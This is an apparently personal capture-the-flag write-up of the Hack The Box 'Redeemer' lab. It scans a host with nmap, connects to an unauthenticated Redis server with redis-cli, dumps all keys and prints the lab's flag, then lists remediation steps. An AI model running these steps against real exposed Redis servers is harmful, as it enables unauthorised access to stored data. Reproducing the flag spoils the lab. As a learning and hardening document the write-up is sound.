# HTB - Redeemer

**Platform:** Hack The Box — Starting Point, Tier 0  
**OS:** Linux  
**Difficulty:** Very Easy  
**Status:** Pwned ✅

---

## Summary

Redeemer is a Linux machine from HTB Starting Point focused on Redis, an in-memory key-value database widely used in production environments. The misconfiguration here is straightforward: Redis is exposed on the network with no authentication required, allowing anyone to connect and dump all stored data — including the flag.

---

## Tools Used

- `nmap` — port scanning and service enumeration
- `redis-cli` — Redis command line client

---

## Steps

### 1. Port Scanning

Since Redis doesn't run on standard ports like 80 or 22, a full port scan is needed:

```bash
nmap -sV -p- --min-rate 5000 10.129.136.187
```

Result:

```
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

Only Redis is exposed on port 6379. No authentication banner, no firewall — wide open.

### 2. Connecting to Redis

```bash
redis-cli -h 10.129.136.187
```

Connected immediately with no password required:

```
10.129.136.187:6379>
```

### 3. Enumerating Keys

```bash
keys *
```

Output:

```
1) "temp"
2) "numb"
3) "flag"
4) "stor"
```

The key `flag` is right there in plain sight.

### 4. Reading the Flag

```bash
get flag
```

```
"03e1d2b376c37ab3f53199922053953eb"
```

---

## What I Learned

- Redis runs on port 6379 by default and should never be exposed publicly without authentication
- The `redis-cli` tool allows direct interaction with a Redis instance from the command line
- `keys *` lists all keys stored in the database — in a real scenario this could expose sensitive application data, session tokens, or credentials
- Full port scans (`-p-`) are essential when the target service doesn't run on common ports

---

## Remediation

- Enable Redis authentication with a strong password (`requirepass` in redis.conf)
- Bind Redis to localhost only (`bind 127.0.0.1`) so it's not accessible from the network
- Use a firewall to block port 6379 from external access
- Never store sensitive data in Redis without encryption
